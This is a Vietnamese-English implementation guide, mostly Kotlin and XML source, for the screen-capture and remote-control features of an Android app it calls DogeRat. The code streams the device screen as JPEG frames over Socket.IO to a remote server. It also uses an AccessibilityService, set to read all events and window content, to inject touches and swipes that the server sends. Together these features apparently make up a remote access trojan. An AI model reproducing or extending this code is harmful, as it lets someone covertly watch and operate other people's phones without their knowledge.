# Android Screen Control Implementation Guide

Hướng dẫn triển khai tính năng screen capture và remote control trên Android app cho DogeRat.

## Tổng Quan

Tài liệu này mô tả cách implement:
1. **Screen Capture**: Capture màn hình Android và stream qua Socket.IO
2. **Remote Control**: Nhận và inject touch events từ web client

## Screen Capture Implementation

### 1. Sử dụng MediaProjection API

MediaProjection API cho phép capture màn hình mà không cần root access.

#### Permissions

Thêm vào `AndroidManifest.xml`:

```xml
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
```

#### Implementation

```kotlin
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.graphics.PixelFormat
import android.graphics.Bitmap
import android.util.Base64
import java.io.ByteArrayOutputStream

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var screenWidth = 1080
    private var screenHeight = 1920
    private var screenDensity = 400
    private var captureInterval = 100 // milliseconds (10 FPS default)
    private var isCapturing = false
    private var captureHandler: Handler? = null
    private var captureRunnable: Runnable? = null
    
    // Socket.IO client
    private var socket: Socket? = null
    
    override fun onCreate() {
        super.onCreate()
        // Initialize Socket.IO
        initializeSocket()
    }
    
    fun startCapture(mediaProjectionResult: Intent) {
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mediaProjectionManager.getMediaProjection(
            Activity.RESULT_OK,
            mediaProjectionResult
        )
        
        // Create ImageReader
        imageReader = ImageReader.newInstance(
            screenWidth,
            screenHeight,
            PixelFormat.RGBA_8888,
            2
        )
        
        // Create VirtualDisplay
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            screenWidth,
            screenHeight,
            screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            null
        )
        
        // Setup image listener
        imageReader?.setOnImageAvailableListener({ reader ->
            captureFrame(reader)
        }, Handler(Looper.getMainLooper()))
        
        isCapturing = true
        
        // Start periodic capture
        captureHandler = Handler(Looper.getMainLooper())
        captureRunnable = object : Runnable {
            override fun run() {
                if (isCapturing) {
                    // Trigger capture
                    captureHandler?.postDelayed(this, captureInterval.toLong())
                }
            }
        }
        captureHandler?.post(captureRunnable!!)
    }
    
    private fun captureFrame(reader: ImageReader) {
        val image = reader.acquireLatestImage() ?: return
        
        try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * screenWidth
            
            val bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)
            
            // Crop to actual screen size
            val croppedBitmap = Bitmap.createBitmap(
                bitmap,
                0,
                0,
                screenWidth,
                screenHeight
            )
            
            // Compress and encode
            val compressedBitmap = compressBitmap(croppedBitmap)
            val base64Image = encodeToBase64(compressedBitmap)
            
            // Send via Socket.IO
            sendFrame(base64Image, screenWidth, screenHeight)
            
            bitmap.recycle()
            croppedBitmap.recycle()
            compressedBitmap.recycle()
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            image.close()
        }
    }
    
    private fun compressBitmap(bitmap: Bitmap): Bitmap {
        // Resize if needed (for lower resolution)
        val targetWidth = screenWidth / 2 // Half resolution
        val targetHeight = screenHeight / 2
        
        return Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true)
    }
    
    private fun encodeToBase64(bitmap: Bitmap): String {
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 75, outputStream)
        val byteArray = outputStream.toByteArray()
        return Base64.encodeToString(byteArray, Base64.NO_WRAP)
    }
    
    private fun sendFrame(frameData: String, width: Int, height: Int) {
        socket?.emit("screen-frame", mapOf(
            "frame" to frameData,
            "width" to width,
            "height" to height,
            "timestamp" to System.currentTimeMillis(),
            "quality" to 75
        ))
    }
    
    fun stopCapture() {
        isCapturing = false
        captureHandler?.removeCallbacks(captureRunnable!!)
        virtualDisplay?.release()
        mediaProjection?.stop()
        imageReader?.close()
    }
    
    fun updateQualitySettings(fps: Int, resolution: String, compression: Int) {
        captureInterval = 1000 / fps // Convert FPS to interval
        
        when (resolution) {
            "full" -> {
                screenWidth = getScreenWidth()
                screenHeight = getScreenHeight()
            }
            "half" -> {
                screenWidth = getScreenWidth() / 2
                screenHeight = getScreenHeight() / 2
            }
            "quarter" -> {
                screenWidth = getScreenWidth() / 4
                screenHeight = getScreenHeight() / 4
            }
        }
    }
}
```

### 2. Request Screen Capture Permission

```kotlin
class MainActivity : AppCompatActivity() {
    private val REQUEST_CODE_SCREEN_CAPTURE = 1000
    
    fun requestScreenCapture() {
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        startActivityForResult(captureIntent, REQUEST_CODE_SCREEN_CAPTURE)
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE && resultCode == Activity.RESULT_OK) {
            data?.let {
                // Start screen capture service
                val serviceIntent = Intent(this, ScreenCaptureService::class.java)
                serviceIntent.putExtra("mediaProjectionResult", it)
                startForegroundService(serviceIntent)
            }
        }
    }
}
```

## Remote Control Implementation

### 1. Touch Injection

Có hai cách để inject touch events trên Android:

#### Option A: AccessibilityService (Recommended)

```kotlin
import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.graphics.Path
import android.os.Build
import androidx.annotation.RequiresApi

class RemoteControlService : AccessibilityService() {
    private var socket: Socket? = null
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        initializeSocket()
        setupSocketListeners()
    }
    
    private fun setupSocketListeners() {
        socket?.on("remote-control-command-forward") { args ->
            val command = args[0] as? Map<*, *> ?: return@on
            
            when (command["type"]) {
                "touch" -> handleTouchCommand(command["data"] as Map<*, *>)
                "swipe" -> handleSwipeCommand(command["data"] as Map<*, *>)
                "scroll" -> handleScrollCommand(command["data"] as Map<*, *>)
                "key" -> handleKeyCommand(command["data"] as Map<*, *>)
            }
        }
    }
    
    @RequiresApi(Build.VERSION_CODES.N)
    private fun handleTouchCommand(data: Map<*, *>) {
        val x = (data["x"] as? Number)?.toFloat() ?: return
        val y = (data["y"] as? Number)?.toFloat() ?: return
        val action = data["action"] as? String ?: return
        
        val gesture = when (action) {
            "down" -> GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(
                    Path().apply { moveTo(x, y) },
                    0,
                    100
                ))
                .build()
            "move" -> GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(
                    Path().apply { lineTo(x, y) },
                    0,
                    100
                ))
                .build()
            "up" -> null // End of gesture
            else -> null
        }
        
        gesture?.let {
            dispatchGesture(it, null, null)
        }
    }
    
    @RequiresApi(Build.VERSION_CODES.N)
    private fun handleSwipeCommand(data: Map<*, *>) {
        val startX = (data["startX"] as? Number)?.toFloat() ?: return
        val startY = (data["startY"] as? Number)?.toFloat() ?: return
        val endX = (data["endX"] as? Number)?.toFloat() ?: return
        val endY = (data["endY"] as? Number)?.toFloat() ?: return
        
        val path = Path().apply {
            moveTo(startX, startY)
            lineTo(endX, endY)
        }
        
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 300))
            .build()
        
        dispatchGesture(gesture, null, null)
    }
    
    @RequiresApi(Build.VERSION_CODES.N)
    private fun handleScrollCommand(data: Map<*, *>) {
        val x = (data["x"] as? Number)?.toFloat() ?: return
        val y = (data["y"] as? Number)?.toFloat() ?: return
        val deltaX = (data["deltaX"] as? Number)?.toFloat() ?: return
        val deltaY = (data["deltaY"] as? Number)?.toFloat() ?: return
        
        val path = Path().apply {
            moveTo(x, y)
            lineTo(x - deltaX, y - deltaY)
        }
        
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 200))
            .build()
        
        dispatchGesture(gesture, null, null)
    }
    
    private fun handleKeyCommand(data: Map<*, *>) {
        // Key injection requires different approach
        // Can use Instrumentation or AccessibilityService
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Not needed for touch injection
    }
    
    override fun onInterrupt() {
        // Handle interruption
    }
}
```

#### Option B: Instrumentation (Requires root or system app)

```kotlin
import android.app.Instrumentation
import android.view.MotionEvent

class TouchInjector {
    private val instrumentation = Instrumentation()
    
    fun injectTouch(x: Float, y: Float, action: Int) {
        val event = MotionEvent.obtain(
            System.currentTimeMillis(),
            System.currentTimeMillis(),
            action,
            x,
            y,
            0
        )
        
        instrumentation.sendPointerSync(event)
        event.recycle()
    }
    
    fun injectSwipe(startX: Float, startY: Float, endX: Float, endY: Float) {
        val steps = 20
        val deltaX = (endX - startX) / steps
        val deltaY = (endY - startY) / steps
        
        for (i in 0..steps) {
            val x = startX + deltaX * i
            val y = startY + deltaY * i
            val action = when {
                i == 0 -> MotionEvent.ACTION_DOWN
                i == steps -> MotionEvent.ACTION_UP
                else -> MotionEvent.ACTION_MOVE
            }
            injectTouch(x, y, action)
            Thread.sleep(10)
        }
    }
}
```

### 2. AccessibilityService Configuration

Thêm vào `res/xml/accessibility_service_config.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:packageNames="com.yourapp.package"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFlags="flagDefault"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:settingsActivity="com.yourapp.SettingsActivity" />
```

Đăng ký trong `AndroidManifest.xml`:

```xml
<service
    android:name=".RemoteControlService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_service_config" />
</service>
```

## Socket.IO Integration

### Initialize Socket.IO Client

```kotlin
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

class SocketManager {
    private var socket: Socket? = null
    
    fun initialize(serverUrl: String) {
        val options = IO.Options().apply {
            reconnection = true
            reconnectionAttempts = 5
            reconnectionDelay = 1000
        }
        
        socket = IO.socket(serverUrl, options)
        socket?.connect()
    }
    
    fun setupScreenCaptureListeners() {
        socket?.on("screen-stream-start") { args ->
            val settings = args[0] as? JSONObject
            // Start screen capture with settings
        }
        
        socket?.on("screen-stream-stop") {
            // Stop screen capture
        }
        
        socket?.on("screen-stream-quality") { args ->
            val settings = args[0] as? JSONObject
            // Update quality settings
        }
    }
    
    fun setupRemoteControlListeners() {
        socket?.on("remote-control-start") {
            // Enable remote control
        }
        
        socket?.on("remote-control-stop") {
            // Disable remote control
        }
        
        socket?.on("remote-control-command-forward") { args ->
            val command = args[0] as? JSONObject
            // Process command
        }
    }
}
```

## Performance Optimization

### 1. Frame Compression

- Sử dụng JPEG compression với quality 60-90
- Resize frames theo resolution setting
- Skip frames nếu client không theo kịp

### 2. Network Optimization

- Buffer frames và gửi theo batch
- Adaptive quality dựa trên network conditions
- Compress data trước khi gửi

### 3. Memory Management

- Recycle bitmaps sau khi sử dụng
- Limit buffer size
- Clean up resources khi stop

## Security Considerations

1. **Permissions**: Chỉ request permissions cần thiết
2. **Validation**: Validate tất cả commands từ server
3. **Rate Limiting**: Giới hạn số lượng commands per second
4. **Encryption**: Mã hóa sensitive data (optional)

## Testing

1. Test với các devices khác nhau (screen sizes, Android versions)
2. Test với network conditions khác nhau
3. Test performance với high FPS
4. Test error handling và reconnection

## Notes

- MediaProjection API yêu cầu Android 5.0+
- GestureDescription API yêu cầu Android 7.0+ (API 24+)
- AccessibilityService cần user permission
- Instrumentation chỉ hoạt động với root hoặc system app


